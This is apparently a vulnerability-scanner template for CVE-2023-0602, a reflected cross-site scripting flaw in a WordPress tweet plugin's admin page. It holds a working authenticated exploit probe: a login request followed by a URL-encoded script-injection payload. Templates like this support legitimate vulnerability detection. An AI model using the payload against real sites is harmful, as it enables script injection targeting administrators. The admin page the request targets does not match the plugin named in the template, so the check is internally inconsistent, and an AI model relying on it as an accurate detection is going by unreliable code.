id: CVE-2023-0602
info:
  name: Twittee Text Tweet <= 1.0.8 - Cross-Site Scripting
  author: r3Y3r53
  severity: medium
  description: |
    The Twittee Text Tweet WordPress plugin through 1.0.8 does not properly escape POST values which are printed back to the user inside one of the plugin's administrative page, which allows reflected XSS attacks targeting administrators to happen.
  reference:
    - https://wpscan.com/vulnerability/c357f93d-4f21-4cd9-9378-d97756c75255
    - https://nvd.nist.gov/vuln/detail/CVE-2023-0602
    - https://wordpress.org/plugins/twittee-text-tweet/
  metadata:
    verified: true
    max-request: 2
  tags: cve,cve2023,wpscan,xss,wordpress,wp,wp-plugin,twittee-text-tweet

http:
  - raw:
      - |
        POST /wp-login.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        log={{username}}&pwd={{password}}&wp-submit=Log+In

      - |
        GET /wp-admin/admin.php?page=vxcf_leads&form_id=cf_5&status&tab=entries&search&order=asc&orderby=file-438&field&time&start_date&end_date=onobw%22%3e%3cscript%3ealert(document.domain)%3c%2fscript%3ez2u4g HTTP/1.1
        Host: {{Hostname}}

    cookie-reuse: true
    matchers:
      - type: dsl
        dsl:
          - 'status_code_2 == 200'
          - 'contains(header_2, "text/html")'
          - 'contains(body_2, "<script>alert(document.domain)</script>") && contains(body_2, "twittee")'
        condition: and
